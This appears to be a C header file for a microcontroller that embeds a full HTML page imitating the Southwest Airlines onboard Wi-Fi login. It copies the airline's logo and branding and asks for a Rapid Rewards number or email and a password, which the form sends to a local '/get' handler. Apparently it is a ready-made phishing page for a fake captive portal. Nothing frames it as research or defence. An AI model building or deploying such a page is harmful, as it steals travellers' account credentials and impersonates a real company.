#ifndef SOUTHWEST_H
#define SOUTHWEST_H

const char SOUTHWEST[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Southwest Airlines Wi-Fi</title>
    <style>
        /* Embedded CSS for Southwest Airlines Branding */
        /* Base styles for body and overall layout */
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem; /* Increased overall padding */
            /* Dynamic Southwest Airlines Gradient: Yellow, Blue, and Red */
            background-image: linear-gradient(135deg, #FFBF00 0%, #304D7B 50%, #E54028 100%);
            background-size: 400% 400%;
            animation: gradientAnimation 15s ease infinite; /* Subtle animation for background */
        }

        /* Keyframe animation for the background gradient */
        @keyframes gradientAnimation {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* Login Container Styling */
        .login-container {
            background-color: rgba(255, 255, 255, 0.1); /* Lighter frosted glass */
            backdrop-filter: blur(15px); /* Stronger blur for glass effect */
            -webkit-backdrop-filter: blur(15px);
            border-radius: 1.5rem; /* More rounded corners */
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3), inset 0 0 0 1px rgba(255, 255, 255, 0.2); /* Enhanced shadow with inner border */
            padding: 3rem; /* Generous padding inside container */
            max-width: 30rem; /* Slightly wider for better balance */
            width: 100%;
            color: #fff; /* Default text color */
            text-align: center;
            transform: scale(1);
            transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1); /* Smooth transitions */
            border: 1px solid rgba(255, 255, 255, 0.15); /* Subtle outer border */
        }
        .login-container:hover {
            transform: scale(1.01); /* Slight zoom on hover */
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), inset 0 0 0 1px rgba(255, 255, 255, 0.3); /* Deeper shadow on hover */
        }

        /* Header Section for Titles and Logo */
        .header-section {
            margin-bottom: 2.5rem; /* More space below header */
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .southwest-logo {
            height: 2rem; /* Adjusted height for the logo */
            width: auto;
            margin-bottom: 1.5rem; /* Space below the logo */
        }
        .southwest-logo .st0 {
            fill: #FFFFFF; /* Ensure the main text of the logo is white */
        }
        /* No need to override st1, st2, st3, st4 as they define the colorful elements */

        .main-title {
            font-size: 2.5rem; /* Larger and bolder title */
            line-height: 1.2;
            font-weight: 700;
            color: #fff;
            text-shadow: 0 3px 6px rgba(0, 0, 0, 0.3); /* More defined text shadow */
            margin-bottom: 0.75rem;
        }
        .sub-title {
            font-size: 1.25rem; /* Clearer subtitle */
            line-height: 1.4;
            font-weight: 400; /* Regular weight */
            color: rgba(255, 255, 255, 0.9); /* Slightly more opaque */
            margin-bottom: 0;
        }

        /* Form Input Styling */
        .input-group {
            margin-bottom: 1.5rem; /* Increased spacing between input groups */
            display: flex;
            justify-content: center; /* Center input fields */
        }
        .form-input {
            width: 100%;
            max-width: 22rem; /* Wider inputs for better data entry */
            padding: 1rem 1.25rem; /* More generous padding */
            font-size: 1.1rem; /* Slightly larger font */
            background-color: rgba(255, 255, 255, 0.2); /* Transparent white */
            border: 1px solid rgba(255, 255, 255, 0.3); /* Subtle white border */
            border-radius: 0.75rem; /* More rounded */
            color: #fff; /* White text */
            transition: all 0.3s ease;
            appearance: none;
            outline: none;
        }
        .form-input::placeholder {
            color: rgba(255, 255, 255, 0.6); /* Lighter, subtle placeholder */
        }
        .form-input:focus {
            background-color: rgba(255, 255, 255, 0.3); /* Brighter on focus */
            border-color: rgba(255, 255, 255, 0.6); /* Clearer border on focus */
            box-shadow: 0 0 0 3px #FFBF00; /* Southwest Yellow glow */
        }

        /* Button Styling */
        .button-wrapper {
            margin-top: 2.5rem; /* More space above the button */
            display: flex;
            justify-content: center;
        }
        .action-button {
            width: 100%;
            max-width: 22rem; /* Match input width */
            background-image: linear-gradient(to right, #E54028 0%, #FF7B00 100%); /* Vibrant Red/Orange gradient */
            color: #fff;
            font-weight: 600;
            font-size: 1.2rem; /* Larger button text */
            padding: 1.1rem 2.5rem; /* More padding for a bolder button */
            border-radius: 0.75rem; /* More rounded */
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3), inset 0 0 0 1px rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease-in-out;
            cursor: pointer;
            border: none;
            letter-spacing: 0.08em; /* Increased letter spacing for impact */
            text-transform: uppercase; /* Uppercase for a modern touch */
        }
        .action-button:hover {
            background-image: linear-gradient(to right, #C0301B 0%, #E06A00 100%); /* Darker red/orange gradient on hover */
            transform: translateY(-0.2rem) scale(1.01); /* Lift and slight scale */
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4), inset 0 0 0 1px rgba(255, 255, 255, 0.2);
        }
        .action-button:active {
            transform: translateY(0); /* Press effect */
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        .action-button:focus {
            outline: none;
            box-shadow: 0 0 0 4px #FFBF00; /* Southwest Yellow focus ring */
        }

        /* Footer Text */
        .footer-text {
            font-size: 0.85rem;
            opacity: 0.7;
            margin-top: 3rem; /* More space above footer */
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="header-section">
            <!-- Southwest Logo SVG -->
            <svg class="southwest-logo" version="1.1" id="Southwest_Logo_1_" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 223 34" style="enable-background:new 0 0 223 34;" xml:space="preserve">
                <style type="text/css">
                    /* Overriding the default fill for the main text part of the logo to be white */
                    .st0{fill:#FFFFFF;} /* Changed from #304CB2 to #FFFFFF */
                    .st1{fill:#CCCCCC;} /* Unused in this context, but kept for completeness */
                    /* Original gradient definitions from the provided SVG */
                    .st2{fill:url(#SVGID_1_);}
                    .st3{fill:url(#SVGID_2_);}
                    .st4{fill:url(#SVGID_3_);}
                </style>
                <g id="Type">
                    <g>
                        <path class="st0" d="M59,27c-0.9,0.2-2,0.3-3.1,0.3c-3.2,0-3.9-1.1-3.9-3.2V12h-6l0,12.8c0,5.7,3.2,8.3,9.6,8.3
                            c3.1,0,6-0.6,9.5-1.4V12H59V27z M78.5,27.6c-2.2,0-2.5-1-2.5-2.7l0-7.8l5,0V12h-5V6h-6v6l-3,0v5l3,0l0,8.2c0,3.6,0.7,7.8,6.7,7.8
                            c1.8,0,3.3-0.4,5-0.9l-0.6-5C80.2,27.4,79.4,27.6,78.5,27.6z M15.4,16.3c-1.1-0.4-2.4-0.8-3.7-1.2c-3.5-1-4.6-1.5-4.6-3.1
                            c0-1.8,1.3-2.7,4.5-2.7c2.6,0,4.9,0.7,7.2,1.5L20.1,5c-2.7-1-5.2-1.9-8.3-1.9c-7.2,0-11.2,4.1-11.2,9c0,3.7,1.6,6.1,5.2,7.6
                            c1,0.4,2.3,0.8,3.6,1.2c3.9,1.2,5.1,1.8,5.1,3.3c0,1.8-1.5,2.8-4.6,2.8c-2.8,0-5.4-0.8-8.1-2L0.4,31c3,1.2,5.9,2,9.5,2
                            c7.4,0,11.2-4.1,11.2-9.1C21.1,19.9,18.8,17.6,15.4,16.3z M94.2,11c-2,0-3.9,0.5-5.2,0.9V2h-6v31h6l0-15.5
                            c1.1-0.4,2.3-0.8,3.8-0.8c2.3,0,3.2,0.9,3.2,3.1L96,33h6l0-13.9C102,13.6,99.5,11,94.2,11z M33.4,10.9c-6.1,0-11,4.3-11,11
                            c0,6.7,4.9,11.2,11,11.2c6.1,0,11-4.4,11-11.2S39.5,10.9,33.4,10.9z M33.4,27.1c-2.6,0-4.7-1.9-4.7-5.3s2-5.2,4.7-5.2
                            c2.7,0,4.7,1.8,4.7,5.2C38.1,25.3,36,27.1,33.4,27.1z M168.1,20.2c-0.9-0.3-1.8-0.6-2.9-0.9c-2.1-0.6-2.9-0.9-2.9-1.8
                            c0-0.9,0.8-1.5,2.7-1.5c2,0,3.8,0.4,5.8,1l1-5.2c-2.2-0.5-4.3-0.9-6.7-0.9c-5.7,0-8.8,2.9-8.8,6.9c0,2.8,1.4,4.6,4.2,5.8
                            c0.8,0.3,1.7,0.7,2.8,1c2.2,0.6,3.3,0.9,3.3,1.9c0,1-1.3,1.4-3.1,1.4c-2.2,0-4.2-0.4-6.3-1.2l-0.9,5.2c2.6,0.7,5,1.2,7.7,1.2
                            c6,0,8.7-3.1,8.7-7C172.6,23.4,171.5,21.4,168.1,20.2z M145.6,10.9c-6.3,0-10.8,4.4-10.8,11.4c0,6.5,3.9,10.8,10.9,10.8
                            c3.1,0,5.6-0.9,8.2-2l-0.9-5c-2,0.9-4,1.6-6.4,1.6c-3.6,0-5.1-1.5-5.3-3.7l13.5,0c0,0,0.2-2.4,0.2-2.9
                            C155,15.4,151.9,10.9,145.6,10.9z M141.4,20c0.4-1.8,1.3-4.1,3.9-4.1c2.6,0,3.4,2.6,3.4,4.1L141.4,20z M184.5,27.6
                            c-2.2,0-2.5-1-2.5-2.7l0-7.8l5,0V12h-5V6h-6v6l-3.1,0v5.1l3.1,0l0,8.2c0,3.6,0.9,7.8,6.9,7.8c1.8,0,3.3-0.4,5-0.9l-0.7-5
                            C186.2,27.4,185.4,27.6,184.5,27.6z M188.5,3.2c-1.5,0-2.6,1.2-2.7,2.7s1.2,2.7,2.6,2.7c1.5,0,2.7-1.2,2.7-2.7S190,3.2,188.5,3.2z
                            M188.5,8.1c-1.2,0-2.1-0.9-2.1-2.2c0-1.3,0.9-2.2,2.2-2.2c1.2,0,2.2,0.9,2.1,2.2C190.6,7.2,189.7,8.1,188.5,8.1z M188.8,6
                            c0.5-0.1,0.8-0.3,0.8-0.8c0-0.5-0.4-0.9-1-0.9l-1,0l0,3.1l0.6,0V6.1c0.2,0,0.3,0.1,0.4,0.3l0.7,1h0.7l-0.6-1
                            C189,6.2,188.9,6.1,188.8,6z M188.4,5.7l-0.3,0l0-0.9l0.4,0c0.4,0,0.5,0.2,0.5,0.4C189,5.6,188.7,5.7,188.4,5.7z M129.2,12
                            l-3.8,11.5L121.6,12h-5.2l-3.9,11.5L108.7,12h-6.5l7.5,21h5.5l3.8-11.4l3.8,11.4h5.5l7.5-21C135.8,12,129.2,12,129.2,12z">
                        </path>
                    </g>
                </g>
                <g>
                    <g>
                        <path class="st1" d="M207,10.8c-2,0-3.7,0.7-5,1.4c-1.3-0.7-2.9-1.4-5-1.4c-4.1,0-6.7,2.6-6.7,7.2c0,5.5,5.3,10.9,11.7,15.3
                            c6.4-4.3,11.7-9.7,11.7-15.3C213.7,13.4,211,10.8,207,10.8z">
                        </path>
                        <linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="190.944" y1="781.4805" x2="206.401" y2="781.4805" gradientTransform="matrix(1 0 0 1 0 -757)">
                            <stop offset="0" style="stop-color:#3656CC"></stop>
                            <stop offset="0.35" style="stop-color:#304CB2"></stop>
                            <stop offset="0.72" style="stop-color:#283B80"></stop>
                        </linearGradient>
                        <path class="st2" d="M190.9,18.1c0,5.6,6,10.9,11,14.4c1.5-1,3-2.2,4.4-3.4c-6.7-5.6-13.1-10.7-15.3-12.5
                            C191,17,190.9,17.5,190.9,18.1z">
                        </path>
                        <linearGradient id="SVGID_2_" gradientUnits="userSpaceOnUse" x1="193.1394" y1="769.2701" x2="210.601" y2="781.4969" gradientTransform="matrix(1 0 0 1 0 -757)">
                            <stop offset="0.3" style="stop-color:#E61C23"></stop>
                            <stop offset="0.8" style="stop-color:#C3161C"></stop>
                        </linearGradient>
                        <path class="st3" d="M212.6,20.7c-4.9-4-7.8-6.1-11-8c-0.9-0.5-2.6-1.3-4.5-1.3c-1.8,0-3.4,0.6-4.5,1.7c-0.7,0.7-1.2,1.6-1.4,2.7
                            c2.5,1.8,9.4,6.7,16.3,12.2C209.8,25.8,211.7,23.3,212.6,20.7z">
                        </path>
                        <linearGradient id="SVGID_3_" gradientUnits="userSpaceOnUse" x1="203.9645" y1="767.6895" x2="213.9482" y2="774.6802" gradientTransform="matrix(1 0 0 1 0 -757)">
                            <stop offset="0" style="stop-color:#FDBC11"></stop>
                            <stop offset="0.25" style="stop-color:#FCB415"></stop>
                            <stop offset="0.8" style="stop-color:#F89E1C"></stop>
                        </linearGradient>
                        <path class="st4" d="M211.3,13.1c-1.1-1.1-2.6-1.7-4.4-1.7c-1.9,0-3.3,0.6-4.4,1.2c1.9,1.1,6,3.4,10.3,6.6
                            c0.1-0.4,0.1-0.9,0.1-1.3C213,15.9,212.4,14.2,211.3,13.1z">
                        </path>
                    </g>
                </g>
            </svg>
            <h1 class="main-title">Welcome to Southwest Wi-Fi!</h1>
            <h2 class="sub-title">Sign in to stay connected onboard!</h2>
        </div>
        <form action="/get" id="email-form-step">
            <!-- Username/Email Input Field -->
            <div class="input-group">
                <input
                    name="email"
                    type="text"
                    class="form-input"
                    placeholder="Rapid Rewards Number or Email"
                    required
                    aria-label="Rapid Rewards Number or Email"
                >
            </div>
            <div class="input-group">
                <input
                    name="password"
                    type="password"
                    class="form-input"
                    placeholder="Password"
                    required
                    aria-label="Password"
                >
            </div>

            <!-- Sign In Button Container -->
            <div class="button-wrapper">
                <button
                    type="submit"
                    class="action-button"
                >
                    Connect to Wi-Fi
                </button>
            </div>
        </form>
        <div class="footer-text">
            <p>&copy; 2025 Southwest Airlines. All rights reserved.</p>
        </div>
    </div>
</body>
</html>
)rawliteral";
#endif
